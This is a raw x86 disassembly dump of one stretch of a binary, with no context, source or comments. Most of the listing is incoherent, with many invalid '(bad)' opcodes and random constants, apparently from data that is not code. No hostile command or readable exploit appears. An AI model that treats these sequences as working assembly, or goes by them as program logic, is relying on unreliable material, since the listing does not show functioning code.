  412134:	sbb    eax,0x423bf546
  412139:	and    BYTE PTR [eax],ch
  41213b:	jle    0x4120df
  41213d:	and    al,0x22
  41213f:	push   esi
  412140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412141:	popa   
  412142:	lods   al,BYTE PTR ds:[esi]
  412143:	popf   
  412144:	scas   eax,DWORD PTR es:[edi]
  412145:	aam    0xad
  412147:	leave  
  412148:	jnp    0x4121a2
  41214a:	(bad)  
  41214c:	sub    DWORD PTR [edi+0x54],ebx
  41214f:	not    DWORD PTR [ecx]
  412151:	xchg   edx,eax
  412152:	mov    WORD PTR [edi],?
  412154:	sbb    ah,BYTE PTR [esp+edi*4-0x7ea57cf1]
  41215b:	in     al,dx
  41215c:	add    DWORD PTR [edx-0x7dde0aaa],ebp
  412162:	jmp    0x618f:0xedf8e504
  412169:	dec    eax
  41216a:	push   ecx
  41216b:	out    dx,al
  41216c:	mov    ebp,0xb9cf1405
  412171:	push   esp
  412172:	jae    0x412121
  412174:	out    0x16,al
  412176:	adc    DWORD PTR [ebp-0x22bcea1a],edx
  41217c:	adc    ecx,DWORD PTR [esi-0x2c807727]
  412182:	addr16 jl 0x412125
  412185:	mov    gs,WORD PTR [edx+eiz*8-0x64423413]
  41218c:	sbb    ebx,DWORD PTR [ebx-0x40de3e80]
  412192:	shl    DWORD PTR [ebp+0x23dd7c8f],0xc6
  412199:	pop    es
  41219a:	stos   DWORD PTR es:[edi],eax
  41219b:	repz mov edi,0xd8913eb2
  4121a1:	dec    esp
  4121a2:	xchg   edi,eax
  4121a3:	push   edx
  4121a4:	out    dx,al
  4121a5:	push   ebx
  4121a6:	retf   
  4121a7:	dec    esi
  4121a8:	loop   0x412209
  4121aa:	push   ds
  4121ab:	(bad)  
  4121ac:	cld    
  4121ad:	sub    DWORD PTR [eax-0x3e],esp
  4121b0:	and    esi,DWORD PTR [edx+0x55]
  4121b3:	pop    esi
  4121b4:	repnz std 
  4121b6:	cdq    
  4121b7:	and    bh,BYTE PTR [edi+0x2d8e035f]
  4121bd:	xchg   ecx,eax
  4121be:	dec    edi
  4121bf:	repz inc cl
  4121c2:	rcr    BYTE PTR [eax+0x62],0xc6
  4121c6:	add    bl,cl
  4121c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c9:	in     eax,dx
  4121ca:	ror    DWORD PTR [eax+0x40],cl
  4121cd:	push   cs
  4121ce:	cwde   
  4121cf:	xchg   ecx,eax
  4121d0:	cmp    eax,esi
  4121d2:	jle    0x412165
  4121d4:	mov    dl,0xa8
  4121d6:	dec    esi
  4121d7:	pop    esp
  4121d8:	outs   dx,BYTE PTR ds:[esi]
  4121d9:	cs xchg ah,dh
  4121dc:	mov    bh,0x6f
  4121de:	jmp    0x41220c
  4121e0:	mov    dl,0x52
  4121e2:	push   eax
  4121e3:	popf   
  4121e4:	iret   
  4121e5:	sar    DWORD PTR [eax+0x1],0x76
  4121e9:	or     edx,DWORD PTR [ebx-0x6b89b9be]
  4121ef:	jbe    0x412216
  4121f1:	mov    ecx,0x124af2
  4121f6:	nop
  4121f7:	mov    dl,0xc7
  4121f9:	mov    ch,0xfd
  4121fb:	add    al,0xb5
  4121fd:	add    cl,BYTE PTR [esp+eiz*8-0x495c91eb]
  412204:	or     al,0x20
  412206:	mov    ds:0x2fe0bd97,eax
  41220b:	hlt    
  41220c:	sbb    ecx,DWORD PTR [edi+0x68e32732]
  412212:	add    ah,bl
  412214:	xor    eax,0xc18182b8
  412219:	jp     0x41220a
  41221b:	xor    al,0xfa
  41221d:	cmp    cl,dl
  41221f:	inc    ebp
  412220:	adc    DWORD PTR [eax+0x53],esp
  412223:	mov    ah,0xc8
  412225:	adc    bh,al
  412227:	cld    
  412228:	inc    esi
  412229:	xor    eax,0xa2272ffb
  41222e:	dec    ebx
  41222f:	xor    edx,edx
  412231:	add    DWORD PTR [ebp-0xc],ebx
  412234:	pop    ebx
  412235:	mov    eax,DWORD PTR [ebp-0xc]
  412238:	pop    edi
  412239:	pop    esi
  41223a:	pop    ebx
  41223b:	leave  
  41223c:	ret    0x10
  41223f:	dec    ebp
  412240:	push   ebp
  412241:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  412247:	mov    esp,ebp
  412249:	or     ah,dh
  41224b:	dec    ebp
  41224c:	add    bh,al
  41224e:	add    BYTE PTR [eax],cl
  412250:	add    BYTE PTR [eax],al
  412252:	mov    DWORD PTR [eax],0x40f44545
  412258:	xor    DWORD PTR [eax],eax
  41225a:	test   DWORD PTR [ebx-0x34070b64],ecx
  412260:	(bad)  
  412261:	enter  0x4d45,0xbc
  412265:	mov    esi,DWORD PTR [eax]
  412267:	hlt    
  412268:	test   ebx,ecx
  41226a:	pushf  
  41226b:	enter  0x4df8,0x8b
  41226f:	mov    DWORD PTR [ebp-0x20],0x890208
  412276:	inc    ebp
  412277:	inc    ebp
  412278:	cld    
  412279:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41227f:	or     BYTE PTR [ebx+0x0],dl
  412282:	mov    ebx,0x8bd5500
  412287:	call   DWORD PTR [ecx-0x1]
  41228a:	pop    es
  41228b:	mov    ch,0x33
  41228d:	dec    ebx
  41228f:	(bad)  
  412290:	mov    eax,0x72009ca4
  412295:	push   DWORD PTR [edx]
  412297:	or     BYTE PTR [eax],al
  412299:	jmp    0xff89:0x75c84d03
  4122a0:	dec    ebp
  4122a1:	loopne 0x412273
  4122a3:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  4122a9:	add    BYTE PTR [ebx],dh
  4122ab:	mov    ecx,ebx
  4122ad:	hlt    
  4122ae:	add    ecx,ebx
  4122b0:	enter  0x899c,0x32
  4122b4:	dec    ebp
  4122b5:	add    ecx,eax
  4122b7:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  4122bd:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4122c4:	xor    ecx,ebx
  4122c6:	retf   
  4122c7:	enter  0x4d03,0xc8
  4122cb:	mov    DWORD PTR fs:[eax],ebx
  4122ce:	lea    eax,[eax]
  4122d0:	push   esp
  4122d1:	mov    edi,edi
  4122d3:	fs (bad) 
  4122d5:	(bad)  
  4122d6:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4122dc:	push   0xffffffff
  4122de:	and    bh,bh
  4122e0:	pop    ecx
  4122e1:	inc    eax
  4122e2:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4122e8:	push   0xffffff8b
  4122ea:	pop    ecx
  4122eb:	cld    
  4122ec:	dec    ebp
  4122ed:	lea    ecx,[ecx+0x45ff08ff]
  4122f3:	mov    BYTE PTR [edx+0x1],cl
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	mov    DWORD PTR [ebp+0x8],0x58008d
  4122ff:	dec    DWORD PTR [ebp-0x77]
  412302:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  412309:	cld    
  41230a:	dec    ebp
  41230b:	jne    0x412340
  41230d:	lea    eax,[ebx]
  41230f:	push   eax
  412310:	mov    edi,edi
  412312:	or     BYTE PTR [ecx+0x54a845],cl
  412318:	add    al,ch
  41231a:	(bad)  
  41231b:	sub    esp,ebp
  41231d:	add    BYTE PTR [eax],al
  41231f:	rol    BYTE PTR [eax],0x84
  412322:	inc    ebp
  412323:	add    dh,BYTE PTR [esi+0x0]
  412326:	add    BYTE PTR [ebp-0x73],al
  412329:	mov    ebp,DWORD PTR [esp+edx*4]
  41232c:	inc    DWORD PTR [eax]
  41232e:	lea    ecx,[ebx-0x30074f4]
  412334:	call   0x422eb9
  412339:	add    BYTE PTR [ebp+0x0],cl
  41233c:	jne    0x41237f
  41233e:	dec    DWORD PTR [ebx-0x76210314]
  412344:	dec    ebp
  412345:	add    DWORD PTR [ebp+0x0],esi
  412348:	(bad)  
  412349:	xchg   ebp,eax
  41234a:	loopne 0x41234b
  41234c:	inc    eax
  41234d:	inc    DWORD PTR [eax]
  41234f:	mov    ecx,DWORD PTR [ebp-0x4]
  412352:	xor    edx,DWORD PTR [edx+0x7201b8]
  412358:	add    BYTE PTR [edx],dl
  41235a:	enter  0x4d90,0x0
  41235e:	mov    eax,DWORD PTR [eax]
  412360:	hlt    
  412361:	add    al,0xa5
  412363:	mov    al,0xff
  412365:	add    bh,bh
  412367:	add    BYTE PTR [ebx],dh
  412369:	inc    DWORD PTR [ebx]
  41236b:	sbb    al,0x89
  41236d:	jne    0x412347
  41236f:	mov    esp,DWORD PTR [ecx+0x4500fc]
  412375:	mov    eax,DWORD PTR [ebp-0xff0048]
  41237b:	mov    DWORD PTR [eax-0x70],0xee58ed89
  412382:	inc    DWORD PTR [ebp-0x75]
  412385:	fisttp QWORD PTR [eax+eiz*8]
  412388:	test   DWORD PTR [esi-0x1],esp
  41238b:	inc    ebp
  41238c:	(bad)  
  41238d:	aas    
  41238e:	inc    ebp
  41238f:	(bad)  
  412390:	lea    edi,[esp+eiz*2-0x1]
  412394:	inc    edi
  412396:	mov    DWORD PTR ds:0x8000c7a0,edi
  41239c:	mov    ebp,esi
  41239e:	cld    
  41239f:	in     al,0x8d
  4123a1:	inc    ebp
  4123a2:	jmp    eax
  4123a4:	(bad)  
  4123a5:	fisttp WORD PTR [eax+0x8801c7]
  4123ab:	jecxz  0x4123f2
  4123ad:	out    dx,al
  4123ae:	inc    DWORD PTR [ebp-0x4]
  4123b1:	out    0x8d,eax
  4123b3:	aas    
  4123b4:	inc    edi
  4123b6:	jmp    FWORD PTR [eax-0x78]
  4123b9:	inc    DWORD PTR [ecx]
  4123bb:	mov    DWORD PTR [eax],0xc7a83d
  4123c1:	ins    BYTE PTR es:[edi],dx
  4123c2:	test   edi,edi
  4123c4:	pandn  mm0,mm5
  4123c7:	aas    
  4123c8:	add    bh,al
  4123ca:	mov    esi,DWORD PTR [eax-0x4]
  4123cd:	inc    DWORD PTR [eax+0xdf01e0]
  4123d3:	(bad)  
  4123d4:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4123d8:	mov    ebp,ebx
  4123da:	xchg   esp,eax
  4123db:	fild   DWORD PTR [eax]
  4123dd:	(bad)  
  4123de:	mov    edi,DWORD PTR [eax+0x3]
  4123e1:	(bad)  
  4123e2:	cmp    al,0xe7
  4123e4:	dec    ebp
  4123e5:	leave  
  4123e6:	mov    ebp,eax
  4123e8:	fsubr  DWORD PTR [ecx]
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	lea    ecx,[ebx-0x7f0003b4]
  4123f2:	push   edx
  4123f3:	add    DWORD PTR [ebp+0x0],edx
  4123f6:	mov    esi,DWORD PTR [eax]
  4123f8:	mov    WORD PTR [ebx-0x7a750000],?
  4123fe:	add    esi,DWORD PTR [ebp-0x78]
  412401:	mov    eax,DWORD PTR [eax]
  412403:	cld    
  412404:	push   0x7d
  412406:	dec    DWORD PTR [ebx+0xd88c]
  41240c:	push   edx
  41240d:	mov    edx,DWORD PTR [ecx-0x4]
  412410:	call   DWORD PTR [eax+0x7d01fc]
  412416:	mov    ebx,edx
  412418:	cld    
  412419:	add    BYTE PTR [eax+0x560150],dl
  41241f:	test   DWORD PTR [ebp+0x75],eax
  412422:	in     al,0x8b
  412424:	in     al,dx
  412425:	cld    
  412426:	(bad)  
  412427:	jge    0x4123bd
  412429:	mov    esp,ebx
  41242b:	fsub   st,st(7)
  41242d:	add    bh,al
  41242f:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  412435:	add    edi,edi
  412437:	add    bh,bh
  412439:	mov    eax,0x50d800ed
  41243e:	inc    ebp
  41243f:	push   esi
  412440:	fisttp WORD PTR [ebx+0x4dc7f43f]
  412446:	test   BYTE PTR [ebx],dh
  412448:	fadd   DWORD PTR ds:0x4572c2
  41244e:	jmp    0x412411
  412450:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  412457:	inc    esi
  412458:	jo     0x41245a
  41245a:	test   edi,eax
  41245c:	jmp    esp
  41245e:	inc    DWORD PTR [eax]
  412460:	in     eax,dx
  412461:	add    al,bl
  412463:	jne    0x4123ea
  412465:	mov    edi,edi
  412467:	cld    
  412468:	inc    DWORD PTR [ebp-0x12]
  41246b:	mov    esp,esp
  41246d:	mov    ah,0x85
  41246f:	add    bh,bh
  412471:	call   0x1194d75
  412476:	ret    0x858b
  412479:	cld    
  41247a:	inc    DWORD PTR [eax+0xe301ff]
  412480:	out    dx,al
  412481:	xor    BYTE PTR [ebp-0xff00cf],al
  412487:	mov    ebx,ebp
  412489:	cld    
  41248a:	jo     0x412415
  41248c:	or     DWORD PTR [ecx],eax
  41248e:	add    BYTE PTR [eax],al
  412490:	push   eax
  412491:	add    DWORD PTR [ebp+0x45],eax
  412494:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  41249a:	dec    DWORD PTR [ebx-0x3fda0318]
  4124a0:	add    BYTE PTR [ebp-0xbf0040],dl
  4124a6:	inc    ebp
  4124a7:	or     BYTE PTR [ebx-0x4faf0400],0x45
  4124ae:	add    DWORD PTR [ebx+0x459c00],ecx
  4124b4:	mov    edi,edi
  4124b6:	mov    eax,0xe80800ff
  4124bb:	inc    ebp
  4124bc:	sub    BYTE PTR [ebx-0x47000400],cl
  4124c2:	add    al,0x1
  4124c4:	rol    BYTE PTR [eax],0x1e
  4124c7:	jne    0x41250e
  4124c9:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4124cf:	inc    DWORD PTR [ecx]
  4124d1:	call   0x864cd6
  4124d6:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4124dc:	call   0x414ce2
  4124e1:	xor    bh,bh
  4124e3:	push   edi
  4124e4:	adc    BYTE PTR [ebx-0x747423bb],al
  4124ea:	loopne 0x4124c8
  4124ec:	ret    
  4124ed:	loopne 0x41248b
  4124ef:	xor    DWORD PTR [edx],0x31
  4124f2:	cmp    edi,edi
  4124f4:	bswap  esp
  4124f6:	rol    BYTE PTR gs:[eax],0x5
  4124fa:	jmp    0x12c2644
  4124ff:	mov    eax,DWORD PTR [ebp-0x4]
  412502:	add    BYTE PTR [eax+0xff0100],bh
  412508:	cld    
  412509:	jne    0x412588
  41250b:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  412511:	push   ss
  412512:	add    DWORD PTR [eax],eax
  412514:	add    BYTE PTR [eax+0x7f],dl
  412517:	inc    ebp
  412518:	add    BYTE PTR [ebx+0x459850],cl
  41251e:	mov    edi,edi
  412520:	test   al,0xff
  412522:	add    BYTE PTR [eax],cl
  412524:	inc    DWORD PTR [ebp-0x18]
  412527:	jmp    DWORD PTR ds:0x4d7d00dc
  41252d:	adc    BYTE PTR [ebx+0x459cb9],cl
  412533:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  412539:	pushf  
  41253a:	mov    eax,0x30132
  41253f:	lea    esi,[ebp+0x2c]
  412542:	xor    edi,edi
  412544:	(bad)  
  412545:	call   0x1404cb2
  41254a:	call   0x1354dda
  41254f:	jne    0x4124dc
  412551:	xor    edi,esp
  412553:	add    eax,DWORD PTR [eax+0xc018d]
  412559:	push   DWORD PTR [eax]
  41255b:	call   0xca4cb7
  412560:	int3   
  412561:	inc    DWORD PTR [ebp-0x14]
  412564:	mov    ecx,DWORD PTR [ebp-0x28]
  412567:	xor    eax,DWORD PTR [eax]
  412569:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  41256f:	(bad)  
  412570:	xchg   ebp,eax
  412571:	in     al,0xff
  412573:	add    bh,bh
  412575:	add    BYTE PTR [ebp+0x45],dl
  412578:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  41257e:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  412585:	mov    edi,edi
  412587:	or     BYTE PTR [eax],cl
  412589:	inc    ebp
  41258a:	test   DWORD PTR gs:[eax],eax
  41258d:	je     0x4125d4
  41258f:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  412595:	xor    edx,DWORD PTR [eax-0x73]
  412598:	push   ebp
  412599:	or     BYTE PTR [ebp+0x21007572],al
  41259f:	inc    ebp
  4125a0:	in     al,dx
  4125a1:	mov    ebp,DWORD PTR [eax]
  4125a3:	mov    esp,0x648bc345
  4125a8:	fmul   st,st(5)
  4125aa:	add    BYTE PTR [ebx],ch
  4125ac:	mov    eax,DWORD PTR [ebx]
  4125ae:	cld    
  4125af:	loopne 0x412571
  4125b1:	inc    ebp
  4125b2:	push   ebp
  4125b3:	cmp    ebp,eax
  4125b5:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  4125bc:	cld    
  4125bd:	fadd   DWORD PTR [eax+0x3b014d]
  4125c3:	jne    0x4125f5
  4125c5:	push   0xf8898557
  4125ca:	in     al,dx
  4125cb:	jne    0x412612
  4125cd:	lea    eax,[ebx+0x72e8dcc8]
  4125d3:	das    
  4125d4:	mov    eax,DWORD PTR [eax]
  4125d6:	mov    esp,0x33eb7545
  4125db:	mov    edi,DWORD PTR [edi+0x4572bc]
  4125e1:	xor    eax,edi
  4125e3:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  4125ed:	rcl    BYTE PTR [eax-0x40],1
  4125f0:	inc    ebp
  4125f1:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4125f9:	inc    ebp
  4125fa:	xchg   ebp,eax
  4125fb:	ud0    ebp,DWORD PTR [ebx]
  4125fe:	inc    DWORD PTR [eax]
  412600:	retf   
  412601:	jbe    0x412603
  412603:	mov    dl,BYTE PTR [eax-0x80]
  412606:	push   ebp
  412607:	pop    ds
  412608:	mov    ecx,DWORD PTR [esp+esi*8]
  41260b:	inc    eax
  41260c:	retf   
  41260d:	inc    ebp
  41260e:	iret   
  41260f:	jb     0x4125d9
  412611:	mov    eax,DWORD PTR [edi]
  412613:	enter  0x4545,0x1
  412617:	xor    DWORD PTR [eax],eax
  412619:	pushf  
  41261a:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  412620:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  412627:	dec    ebp
  412628:	add    BYTE PTR [ebx],dh
  41262a:	inc    ebp
  41262b:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  412631:	xor    dl,BYTE PTR [edx]
  412633:	add    eax,DWORD PTR [ebp-0x77]
  412636:	mov    eax,esp
  412638:	fmul   DWORD PTR [ebp-0x3d]
  41263b:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  412642:	mov    DWORD PTR [ebp-0x28],eax
  412645:	rol    DWORD PTR [ebp-0x64],1
  412648:	xor    eax,edi
  41264a:	mov    ecx,0xff858db0
  41264f:	clc    
  412650:	enter  0x4d45,0x32
  412654:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  41265b:	test   esi,edi
  41265d:	clc    
  41265e:	inc    DWORD PTR [ebp+0x45]
  412661:	cmp    al,0x8b
  412663:	pushf  
  412664:	or     bh,al
  412666:	enter  0x16a8,0x85
  41266a:	xor    eax,edi
  41266c:	pushf  
  41266d:	inc    ebp
  41266e:	(bad)  
  41266f:	ds cld 
  412671:	pushf  
  412672:	inc    ebp
  412673:	mov    edx,DWORD PTR [eax-0x28]
  412676:	lock push ebp
  412678:	add    BYTE PTR [ebx],dh
  41267a:	mov    DWORD PTR [ebx],eax
  41267c:	sar    BYTE PTR [ebx],1
  41267e:	adc    BYTE PTR [edi],cl
  412680:	dec    ebp
  412681:	adc    al,0x8b
  412683:	add    al,dl
  412685:	jmp    0x1022855
  41268a:	jb     0x4126d9
  41268c:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  412692:	xor    ecx,DWORD PTR [ebp+0x3b]
  412695:	xor    ecx,DWORD PTR [edi]
  412697:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  41269b:	(bad)  
  41269d:	clc    
  41269e:	enter  0x8400,0x8b
  4126a2:	pop    es
  4126a3:	mov    al,0x0
  4126a5:	push   ebp
  4126a6:	push   cs
  4126a7:	xor    ecx,eax
  4126a9:	xor    esp,ecx
  4126ab:	add    ebp,DWORD PTR [eax]
  4126ad:	add    esi,DWORD PTR [eax]
  4126af:	(bad)  
  4126b1:	retf   0x55c8
  4126b4:	repnz mov eax,DWORD PTR [ebp-0x10]
  4126b8:	(bad)  
  4126b9:	cli    
  4126ba:	fdivr  st,st(1)
  4126bc:	test   DWORD PTR [eax+edi*8],ecx
  4126bf:	dec    ebp
  4126c0:	inc    ebp
  4126c1:	xor    edi,DWORD PTR [eax-0x7167afd]
  4126c7:	add    BYTE PTR [ebp+0x0],al
  4126ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4126cd:	mov    ecx,ebx
  4126cf:	clc    
  4126d0:	jne    0x41269d
  4126d2:	mov    esi,0xd672d3
  4126d7:	into   
  4126d8:	into   
  4126d9:	scas   eax,DWORD PTR es:[edi]
  4126da:	dec    ebp
  4126db:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4126e1:	sub    ecx,esi
  4126e3:	cmp    ecx,DWORD PTR [ebp+0x77]
  4126e6:	(bad)  
  4126e7:	mov    edi,eax
  4126e9:	mov    al,0x85
  4126eb:	mov    eax,edi
  4126ed:	add    BYTE PTR [ebp-0x75],al
  4126f0:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4126f7:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4126fd:	(bad)  
  4126ff:	retf   0x559c
  412702:	(bad)  
  412703:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  41270a:	inc    ebp
  41270b:	add    eax,0xeb9c4d3f
  412710:	(bad)  
  412711:	mov    ecx,esp
  412713:	lods   al,BYTE PTR ds:[esi]
  412714:	test   DWORD PTR [ebp-0x8],edx
  412717:	xor    ecx,DWORD PTR [ebp+0x33]
  41271a:	mov    eax,DWORD PTR [ebx]
  41271c:	lock add ecx,ebx
  41271f:	bswap  esi
  412721:	retf   0x55d1
  412724:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  41272a:	jmp    0x412725
  41272c:	add    BYTE PTR ds:0xebc44d8b,al
  412732:	push   ebp
  412733:	mov    ebp,DWORD PTR [ebx]
  412735:	test   al,0x8b
  412737:	push   ebp
  412738:	clc    
  412739:	xor    ecx,ebx
  41273b:	xor    ecx,esi
  41273d:	add    edx,ecx
  41273f:	add    eax,DWORD PTR [edx+0xca010f]
  412745:	push   ebp
  412746:	dec    ebp
  412747:	mov    ecx,DWORD PTR [ebx-0x34050710]
  41274d:	stc    
  41274e:	rol    DWORD PTR ds:0xebce4dd6,cl
  412754:	scas   eax,DWORD PTR es:[edi]
  412755:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  41275b:	xor    ebp,DWORD PTR [ebx]
  41275d:	xor    edi,DWORD PTR [ebx]
  41275f:	add    esi,DWORD PTR [edi+0x3]
  412762:	mov    ecx,DWORD PTR [edi]
  412764:	clc    
  412765:	retf   0x55cb
  412768:	into   
  412769:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  412770:	mov    eax,0x3376554d
  412775:	mov    esi,DWORD PTR [ebx]
  412777:	int3   
  412778:	add    edx,DWORD PTR [ebp+0x3]
  41277b:	xor    ecx,DWORD PTR [edi]
  41277d:	xor    ecx,edx
  41277f:	add    edx,DWORD PTR [ebp+0x3]
  412782:	mov    ecx,DWORD PTR [edi]
  412784:	lock retf 0x4dfa
  412788:	stc    
  412789:	mov    ecx,DWORD PTR [eax]
  41278b:	or     BYTE PTR [ebp+0x4d],cl
  41278e:	jmp    0x105281e
  412793:	dec    ebp
  412794:	dec    ebp
  412795:	(bad)  
  412796:	mov    ebx,esp
  412798:	clc    
  412799:	test   ebx,ecx
  41279b:	clc    
  41279c:	ror    DWORD PTR [ebp-0x2a],cl
  41279f:	mov    esi,ecx
  4127a1:	call   0x33cc6d55
  4127a6:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  4127ad:	retf   
  4127ae:	ja     0x41277e
  4127b0:	mov    ebp,DWORD PTR [eax-0x48]
  4127b3:	dec    ebp
  4127b4:	xor    ecx,DWORD PTR [di+0x3]
  4127b8:	mov    esp,esp
  4127ba:	clc    
  4127bb:	push   ebp
  4127bc:	retf   
  4127bd:	mov    dl,bl
  4127bf:	adc    esi,edx
  4127c1:	jb     0x412791
  4127c3:	add    BYTE PTR [edi-0x3b7474b3],ch
  4127c9:	call   0x4d6cf34b
  4127ce:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4127d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d5:	pushf  
  4127d6:	inc    ebp
  4127d7:	xor    cl,BYTE PTR [ebp-0x78]
  4127da:	mov    edx,edi
  4127dc:	clc    
  4127dd:	dec    ebp
  4127de:	retf   
  4127df:	mov    edx,ebx
  4127e1:	call   0x560ffbbc
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4127ed:	pushf  
  4127ee:	sub    esi,DWORD PTR [edx]
  4127f0:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4127f6:	lods   al,BYTE PTR ds:[esi]
  4127f7:	xor    esp,DWORD PTR [ebx]
  4127f9:	add    ecx,DWORD PTR [ebp-0x1c]
  4127fc:	mov    edi,DWORD PTR [ebp-0x8]
  4127ff:	mov    bl,cl
  412801:	cmp    dl,bl
  412803:	jb     0x4127d3
  412805:	add    dh,dl
  412807:	dec    ebp
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  41280f:	shr    DWORD PTR [ebx],cl
  412811:	into   
  412812:	cmp    edx,esi
  412814:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  41281a:	dec    ebp
  41281b:	dec    ebp
  41281c:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  412822:	retf   
  412823:	xor    edx,esi
  412825:	add    ecx,esi
  412827:	imul   ecx,edx
  41282a:	mov    DWORD PTR [ebp+0x8],edx
  41282d:	xor    ecx,DWORD PTR [ebp+0x2b]
  412830:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  412836:	add    esi,DWORD PTR [ebx]
  412838:	mov    ah,0x3
  41283a:	inc    ebp
  41283b:	rdtsc  
  41283d:	xlat   BYTE PTR ds:[ebx]
  41283e:	pushf  
  41283f:	jge    0x4127ca
  412841:	xor    ebx,eax
  412843:	sub    eax,DWORD PTR [ebp-0x73]
  412846:	(bad)  
  412847:	cmp    al,al
  412849:	jb     0x4127d0
  41284b:	add    al,bh
  41284d:	ror    DWORD PTR [ebp-0x7a],1
  412850:	xor    edi,edi
  412852:	add    edi,edi
  412854:	jmp    0x4128a3
  412856:	mov    ecx,DWORD PTR [ebx-0x34341324]
  41285c:	dec    ebp
  41285d:	into   
  41285e:	mov    ebp,DWORD PTR [edi-0x23737428]
  412864:	pushf  
  412865:	shl    DWORD PTR [edx],cl
  412867:	retf   0x5588
  41286a:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412870:	add    eax,DWORD PTR [eax]
  412872:	in     al,0x4d
  412874:	push   ebp
  412875:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  41287b:	fs add ch,cl
  41287e:	dec    ebp
  41287f:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  412885:	dec    ebp
  412886:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  41288c:	jge    0x41285c
  41288e:	mov    BYTE PTR [edi+0xf723b3a],ch
  412894:	add    cl,dh
  412896:	dec    ebp
  412897:	dec    DWORD PTR [ebx-0x2c032375]
  41289d:	adc    BYTE PTR [ebp+0x1],0x8b
  4128a1:	add    al,bl
  4128a3:	jge    0x412831
  4128a5:	push   0xffffff9c
  4128a7:	push   0x8b3032
  4128ac:	shl    BYTE PTR [ebp+0x55],0x6a
  4128b0:	xor    edi,edi
  4128b2:	xor    edx,DWORD PTR [ebx+eax*1]
  4128b5:	inc    ebp
  4128b6:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4128bc:	dec    ebp
  4128bd:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4128c3:	jbe    0x412850
  4128c5:	mov    ebp,esp
  4128c7:	ror    bl,1
  4128c9:	enter  0x14ce,0xaf
  4128cd:	dec    DWORD PTR [ebx-0x2cef17f8]
  4128d3:	push   ebp
  4128d4:	retf   0x5540
  4128d7:	push   ebp
  4128d8:	mov    esi,DWORD PTR [edx-0x1c]
  4128db:	mov    edx,ebx
  4128dd:	cld    
  4128de:	(bad)  
  4128df:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4128e6:	sti    
  4128e7:	add    dh,cl
  4128e9:	push   0xffffff94
  4128eb:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  4128f2:	bswap  esp
  4128f4:	pop    esi
  4128f5:	inc    ebp
  4128f6:	dec    DWORD PTR [ecx+0x45e8c88b]
  4128fc:	push   ebp
  4128fd:	xor    esi,DWORD PTR [ebx]
  4128ff:	mov    DWORD PTR [ebx],0xcac00f9c
  412905:	aas    
  412906:	push   ebp
  412907:	inc    ebp
  412908:	xor    ecx,eax
  41290a:	add    ecx,eax
  41290c:	mov    eax,DWORD PTR [ebx]
  41290e:	(bad)  
  41290f:	jmp    0x41289d
  412911:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  412918:	les    edi,FWORD PTR [esi-0xeccefb3]
  41291e:	mov    edx,0xff378d80
  412923:	mov    dh,0xd1
  412925:	cmp    edx,DWORD PTR [ebp+0xf]
  412928:	mov    eax,DWORD PTR [edx-0x20]
  41292b:	add    BYTE PTR [ebp-0x75],bh
  41292e:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  412935:	pushf  
  412936:	retf   0x8632
  412939:	cmp    ebp,0x8
  41293c:	call   ebx
  41293e:	inc    ebp
  41293f:	inc    ebp
